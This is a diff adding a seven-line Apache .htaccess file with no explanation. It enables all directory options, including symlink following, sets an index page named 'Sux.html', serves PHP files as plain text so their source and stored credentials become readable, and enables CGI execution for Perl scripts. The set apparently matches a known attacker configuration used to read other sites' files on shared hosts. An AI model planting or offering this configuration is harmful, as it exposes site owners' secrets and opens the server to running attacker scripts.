@@ -1,0 +1,7 @@
+Options all
+DirectoryIndex Sux.html
+AddType text/plain .php
+AddType application/x-httpd-cgi .pl
+AddHandler server-parsed .php
+AddHandler cgi-script .pl
+AddHandler cgi-script .pl
